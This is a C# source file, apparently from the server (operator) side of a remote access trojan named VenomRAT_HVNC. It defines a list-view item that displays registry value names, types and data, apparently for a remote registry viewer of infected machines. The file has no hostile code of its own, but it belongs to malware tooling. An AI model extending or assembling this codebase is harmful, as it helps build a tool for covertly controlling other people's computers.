using System.Windows.Forms;

namespace VenomRAT_HVNC.Server.Helper
{
    public class RegistryValueLstItem : ListViewItem
    {
        private string _type { get; set; }

        private string _data { get; set; }

        public string RegName
        {
            get
            {
                return base.Name;
            }
            set
            {
                base.Name = value;
                base.Text = RegValueHelper.GetName(value);
            }
        }

        public string Type
        {
            get
            {
                return this._type;
            }
            set
            {
                this._type = value;
                if (base.SubItems.Count < 2)
                {
                    base.SubItems.Add(this._type);
                }
                else
                {
                    base.SubItems[1].Text = this._type;
                }
                base.ImageIndex = this.GetRegistryValueImgIndex(this._type);
            }
        }

        public string Data
        {
            get
            {
                return this._data;
            }
            set
            {
                this._data = value;
                if (base.SubItems.Count < 3)
                {
                    base.SubItems.Add(this._data);
                    return;
                }
                base.SubItems[2].Text = this._data;
            }
        }

        public RegistryValueLstItem(RegistrySeeker.RegValueData value)
        {
            this.RegName = value.Name;
            this.Type = value.Kind.RegistryTypeToString();
            this.Data = RegValueHelper.RegistryValueToString(value);
        }

        private int GetRegistryValueImgIndex(string type)
        {
            if (!(type == "REG_MULTI_SZ") && !(type == "REG_SZ") && !(type == "REG_EXPAND_SZ"))
            {
                if (!(type == "REG_BINARY") && !(type == "REG_DWORD") && !(type == "REG_QWORD"))
                {
                }
                return 1;
            }
            return 0;
        }
    }
}
